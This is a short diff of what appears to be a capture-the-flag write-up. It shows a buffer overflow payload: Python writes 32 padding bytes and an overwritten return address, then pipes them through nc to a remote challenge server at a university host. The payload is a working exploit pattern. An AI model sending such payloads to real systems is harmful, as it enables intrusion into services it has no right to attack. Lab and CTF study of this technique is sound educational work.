@@ -52,5 +52,4 @@ python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25153
 import sys
 sys.stdout.buffer.write(b"A"*32 + b"\xf1\x86\x04\x08")
 EOF
-
 ```
